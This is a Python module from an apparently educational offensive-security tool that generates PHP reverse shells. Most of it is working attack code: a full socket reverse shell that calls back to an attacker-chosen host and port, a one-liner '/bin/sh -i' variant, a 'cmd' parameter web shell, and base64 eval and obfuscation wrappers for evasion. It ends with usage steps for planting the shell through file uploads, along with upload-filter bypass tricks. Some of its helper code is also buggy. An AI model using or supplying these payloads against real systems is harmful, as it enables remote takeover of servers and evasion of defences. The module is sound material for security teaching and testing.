"""
PHP reverse shell payload generator
"""

from .base import PayloadGenerator, PayloadConfig, PayloadExplanation
from learnshells.utils.logger import Logger
from typing import Dict

class PHPGenerator(PayloadGenerator):
    """Generate PHP reverse shell payloads."""
    

    def test_requirements(self, target_info: Dict) -> bool:
        """
        Test if target meets requirements for PHP payload.
    
        Args:
            target_info: Target information dictionary
        
        Returns:
            True if requirements met
        """
        # Check if PHP is detected
        if 'technologies' in target_info:
            if 'PHP' in target_info.get('technologies', []):
                return True
    
        # Check web server for PHP hints
        web_server = target_info.get('web_server', '').lower()
        if 'php' in web_server:
            return True
    
        # Assume PHP might be available (it's very common)
        return True  
# ========== GENERATE METHOD - FIXED ==========
    def generate(self, shell_type: str = "reverse", encode: bool = False, obfuscate: bool = False) -> str:
        """
        Generate PHP reverse shell payload.
        
        Args:
            shell_type: Type of shell ('reverse' or 'web')
            encode: Whether to encode
            obfuscate: Whether to obfuscate
            
        Returns:
            PHP payload string
        """
        # Create logger if it doesn't exist
        if not hasattr(self, 'logger'):
            self.logger = Logger()
        
        # Get lhost and lport from config
        lhost = self.config.lhost
        lport = self.config.lport
        
        if shell_type == "web":
            payload = self._generate_web_shell()
        else:
            payload = self._generate_reverse_shell()
        
        if obfuscate:
            payload = self._obfuscate(payload)
        
        if encode:
            import base64
            encoded = base64.b64encode(payload.encode()).decode()
            payload = f"<?php eval(base64_decode('{encoded}')); ?>"
        
        self.logger.success(
            f"Generated PHP payload ({len(payload)} bytes)",
            explain="PHP reverse shells work great in web contexts. "
                   "They can be uploaded as files or injected into existing PHP code."
        )
        
        return payload
# ========== END GENERATE METHOD ==========
#no indent    
    def _generate_reverse_shell(self) -> str:
        """Generate standard PHP reverse shell."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""<?php
$ip = '{lhost}';
$port = {lport};
$sock = fsockopen($ip, $port);
if (!$sock) {{
    die();
}}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
if (!is_resource($process)) {{
    die();
}}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {{
    if (feof($sock) || feof($pipes[1])) {{
        break;
    }}
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {{
        $input = fread($sock, 1400);
        fwrite($pipes[0], $input);
    }}
    if (in_array($pipes[1], $read_a)) {{
        $input = fread($pipes[1], 1400);
        fwrite($sock, $input);
    }}
    if (in_array($pipes[2], $read_a)) {{
        $input = fread($pipes[2], 1400);
        fwrite($sock, $input);
    }}
}}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>"""
        return payload
    
    def _generate_web_shell(self) -> str:
        """Generate simple PHP web shell for command execution."""
        payload = """<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    die();
}
?>"""
        return payload
    
    def _generate_simple_reverse(self) -> str:
        """Generate simple one-liner PHP reverse shell."""
        payload = f"""<?php $sock=fsockopen("{self.config.lhost}",{self.config.lport});exec("/bin/sh -i <&3 >&3 2>&3"); ?>"""
        return payload
    
    def _obfuscate(self, payload: str) -> str:
        """Obfuscate PHP payload."""
        # Simple obfuscation - variable name randomization
        import random
        import string
        
        var_names = ['$sock', '$ip', '$port', '$process', '$pipes', '$descriptorspec']
        
        for var in var_names:
            new_var = '$' + ''.join(random.choices(string.ascii_lowercase, k=8))
            payload = payload.replace(var, new_var)
        
        return payload
    
    def explain(self, payload: str) -> str:
        """
        Explain PHP payload line by line.
        
        Args:
            payload: PHP payload
            
        Returns:
            Educational explanation
        """
        explanation = """
🎓 PHP REVERSE SHELL EXPLAINED:

Line 1-2: Connection Setup
    $sock = fsockopen($ip, $port);
    Opens a TCP socket connection back to your machine.
    fsockopen() creates a network connection.

Line 3-7: Process Descriptor Setup
    $descriptorspec = array(...);
    Defines how to handle stdin, stdout, stderr.
    All three are connected as "pipes" for communication.

Line 8: Shell Process
    $process = proc_open('/bin/sh', ...);
    Spawns a shell process (/bin/sh or /bin/bash).
    This is the actual shell we'll interact with.

Line 9-12: Non-blocking I/O
    stream_set_blocking(..., 0);
    Sets all streams to non-blocking mode.
    This prevents the shell from hanging.

Line 13-34: Main Loop
    while (1) { ... }
    Infinite loop that:
    1. Reads commands from your listener
    2. Sends them to the shell process
    3. Reads output from the shell
    4. Sends it back to your listener

WHY PHP?
• Common on web servers (LAMP/LEMP stacks)
• Can be uploaded as a file
• Can be injected into existing PHP code
• Works through file upload vulnerabilities

LIMITATIONS:
• Requires PHP to be installed
• May timeout in web context
• Some functions may be disabled (disable_functions)
• Might trigger web application firewalls
"""
        return explanation
    
    def generate_variants(self, lhost: str, lport: int) -> dict:
        """
        Generate multiple PHP payload variants.
        
        Args:
            lhost: Local host IP
            lport: Local port
            
        Returns:
            Dict of payload variants
        """
        variants = {}
        
        # Standard reverse shell
        variants['standard'] = self.generate(lhost, lport)
        
        # Simple one-liner
        self.lhost = lhost
        self.lport = lport
        variants['oneliner'] = self._generate_simple_reverse()
        
        # Web shell
        variants['webshell'] = self._generate_web_shell()
        
        # Base64 encoded
        variants['encoded'] = self.generate(lhost, lport, encode=True)
        
        # Obfuscated
        variants['obfuscated'] = self.generate(lhost, lport, obfuscate=True)
        
        return variants
    
    def get_usage_instructions(self) -> str:
        """Get instructions for using PHP payloads."""
        instructions = """
📋 PHP PAYLOAD USAGE:

Method 1: File Upload
1. Save payload as shell.php
2. Upload through vulnerable file upload
3. Navigate to uploaded file in browser
4. Shell connects back automatically

Method 2: Code Injection
1. Find PHP code injection point
2. Inject payload into vulnerable parameter
3. Execute the page
4. Shell connects back

Method 3: Web Shell
1. Upload web shell (simpler payload)
2. Access via: http://target.com/shell.php?cmd=whoami
3. Upgrade to full shell when ready

TIPS:
• Use .jpg.php, .png.php for filter bypass
• Try .phtml, .php3, .php4, .php5 extensions
• Check for disable_functions in phpinfo()

COMMON UPLOAD BYPASSES:
• Double extension: shell.php.jpg
• Null byte: shell.php%00.jpg
• MIME type tricks
• Case variation: shell.PhP
"""
        return instructions
